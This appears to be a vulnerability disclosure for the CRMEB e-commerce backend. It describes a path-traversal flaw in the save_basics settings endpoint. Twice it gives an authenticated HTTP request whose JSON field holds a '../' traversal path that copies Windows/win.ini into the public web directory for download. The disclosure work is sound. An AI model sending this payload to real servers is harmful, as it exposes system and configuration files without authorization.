# There is an arbitrary file download vulnerability in the CRMEB backend

There is an arbitrary file download vulnerability in the `app/adminapi/controller/v1/setting/SystemConfig.php `route.

![image](https://github.com/user-attachments/assets/ce8fb063-df39-49b4-9884-ca923b687135)


There is an operation to copy files in the `save_basics` function, and there is no filtering `../`, so the system files can be copied to the website directory to perform arbitrary file reading operations.

![image](https://github.com/user-attachments/assets/02ee639f-f931-4399-887e-fdb0936fd494)


Under normal circumstances, the public directory of the website only contains the website code.

![image](https://github.com/user-attachments/assets/b42ec85f-f547-4739-aeea-be2ac827a576)


First log in to the backend, and then use the following poc

```shell
POST /adminapi/setting/config/save_basics HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authori-zation: 
Content-Length: 72
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/admin/setting/agreement
Cookie: OFBiz.Visitor=10000; _jspxcms=d519070f300b47268e1ab5b4af70c446; cb_lang=zh-cn; PHPSESSID=fa8f42ae7d4d4d2600f5da4b2299930a; WS_ADMIN_URL=ws://127.0.0.1/notice; WS_CHAT_URL=ws://127.0.0.1/msg; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJmYTM1NGMxYjBmMTY2MjY2NzUxYTg1NzUxMDgyYTRkMyIsImlzcyI6IjEyNy4wLjAuMSIsImF1ZCI6IjEyNy4wLjAuMSIsImlhdCI6MTczMDcyNDQ3MCwibmJmIjoxNzMwNzI0NDcwLCJleHAiOjE3MzMzMTY0NzAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.3H3NJma1X_ea4yaNfOoq1W-pbmGUfLG5cf8O5d6w7kA; expires_time=1733316470; XDEBUG_SESSION=14746

{
    "weixin_ckeck_file": "../../../../../../../../Windows/win.ini"
}
```

![image](https://github.com/user-attachments/assets/f42c3292-e6a1-4ca7-9007-98e1cd9e81a6)


Successfully copied the `win.ini` system file to the running directory of the website

![image](https://github.com/user-attachments/assets/98900587-825b-4b6a-9aaa-d8e1c379f81a)


And directly access http://127.0.0.1/win.ini to download files

![image](https://github.com/user-attachments/assets/c9a5a904-9f8b-4383-a890-122f4e0afab0)

After dynamic adjustment, you can see that he changed the file from `C:\Users\k\Desktop\shenji\CRMEB-5.4.0\CRMEB-5.4.0\crmeb\public\../../../../ ../../../../Windows/win.ini` was copied to `C:\Users\k\Desktop\shenji\CRMEB-5.4.0\CRMEB-5.4.0\crmeb\public\win. ini`
![image](https://github.com/user-attachments/assets/845154f9-9a58-4cf0-9ea3-347c8fb8ca93)
exp:

```
POST /adminapi/setting/config/save_basics HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authori-zation: 
Content-Length: 72
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/admin/setting/agreement
Cookie: OFBiz.Visitor=10000; _jspxcms=d519070f300b47268e1ab5b4af70c446; cb_lang=zh-cn; PHPSESSID=fa8f42ae7d4d4d2600f5da4b2299930a; WS_ADMIN_URL=ws://127.0.0.1/notice; WS_CHAT_URL=ws://127.0.0.1/msg; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJmYTM1NGMxYjBmMTY2MjY2NzUxYTg1NzUxMDgyYTRkMyIsImlzcyI6IjEyNy4wLjAuMSIsImF1ZCI6IjEyNy4wLjAuMSIsImlhdCI6MTczMDc5MDg3MCwibmJmIjoxNzMwNzkwODcwLCJleHAiOjE3MzMzODI4NzAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.HqbAlDHkPOm0WTPajjFq5G1hM9Ow1aBNt_1rzbdkF6Y; expires_time=1733316470; XDEBUG_SESSION=18503

{
    "weixin_ckeck_file": "../../../../../../../../Windows/win.ini"
}
```
